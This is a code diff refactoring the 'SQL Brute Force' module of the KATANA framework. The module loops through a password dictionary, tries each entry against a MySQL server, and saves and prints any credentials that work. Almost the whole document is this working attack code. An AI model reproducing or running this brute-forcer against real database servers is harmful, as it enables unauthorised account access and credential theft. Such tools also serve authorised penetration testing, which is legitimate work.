@@ -1,13 +1,16 @@
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # @KATANA                       #
-# Modules   : SQL Brute Force   #
+# Module    : SQL Brute Force   #
 # Script by : RedToor           #
 # Date      : 16/05/2015        #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core                   #
 from core.design import *       #
+from core.Setting import *      #
+from core import Errors         #
 from core import help           #
 from core import ping           #
+import sys                      #
 d=DESIGN()                      #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Libraries                     #
@@ -17,17 +20,17 @@ import time                     #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Default                       #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
-defaulthost="127.0.0.1"
-defaultport="3306"
-defaultuser="admin"
-defaultdicc="core/db/pass.dicc"
+defaulthost=LOCAL_IP
+defaultport=SQL_PORT
+defaultuser=USERNAME
+defaultdicc=DITIONARY_PASSWORDS
 
-def run(para,parb,parc,pard):
-	global defaulthost,defaultport,defaultuser,defaultdicc
-	defaulthost=para
-	defaultport=parb
-	defaultuser=parc
-	defaultdicc=pard
+def run(target,port,username,dictionary):
+	global defaulthost,defaultport,defaultdicc
+	defaulthost=target
+	defaultport=port
+	defaultaccount=username
+	defaultdicc=dictionary
 	btsql(1)
 
 def btsql(run):
@@ -43,25 +46,21 @@ def btsql(run):
 			d.descrip("port","no","Port of target",defaultport)
  			d.descrip("user","yes","Username",defaultuser)
  			d.descrip("dict_1","yes","Dictionary pass",defaultdicc)
-			print ""
+			d.space()
 			btsql(0)
 		elif actions[0:10] == "set target":
-			defaulthost = actions[11:]
-			defaulthost = defaulthost.replace("http://", "")
+			defaulthost=defaulthost.replace("http://", "")
+			defaulthost=ping.update(defaulthost,actions,"target")
 			d.change("target",defaulthost)
-			btsql(0)
 		elif actions[0:8] == "set port":
-			defaultport = actions[9:]
+			defaultport=ping.update(defaultport,actions,"port")
 			d.change("port",defaultport)
-			btsql(0)
 		elif actions[0:8] == "set user":
-			defaultuser = actions[9:]
+			defaultuser=ping.update(defaultuser,actions,"user")
 			d.change("user",defaultuser)
-			btsql(0)
 		elif actions[0:10] == "set dict_1":
-			defaultdicc = actions[11:]
+			defaultdicc=ping.update(defaultdicc,actions,"dict_1")
 			d.change("dict_1",defaultdicc)
-			btsql(0)
 		elif actions=="exit" or actions=="x":
 			d.goodbye()
 			exit()
@@ -76,29 +75,27 @@ def btsql(run):
 				ping.live(defaulthost,defaultport)
 				if True:
 					try:
-						d.loading()
+						d.loading_file()
 						try:
 							with open(defaultdicc,'r') as passs:
 								for ps in passs:
 									ps=ps.replace("\n","")
 									try:
-										MySQLdb.connect(defaulthost,us,ps,'')
+										MySQLdb.connect(defaulthost,defaultuser,ps,'')
 										if True:
 											ping.save("BruteForceSQL",defaulthost,defaultport,defaultuser,ps)
-											print "\n-"+Suf+" Successfully with ("+defaultuser+"="+ps+")\n"
+											d.Success(defaultuser,ps)
 											return 1
 									except:
 										print " "+Alr+" Checking ("+defaultuser+"="+ps+")"
 						except:
-							d.filenot(defaultdicc)
-							btpop3(0)
+							Errors.Errors(event=sys.exc_info()[0], info=defaultdicc)
 					except:
-						d.kbi()
+						Errors.Errors(event=sys.exc_info()[0], info=False)
 			except:
-				d.off()
+				Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
 		else:
-			d.nocommand()
+			d.No_actions()
 	except:
-		d.kbi()
-		exit()
+		Errors.Errors(event=sys.exc_info()[0], info=False)
 	btsql(0)
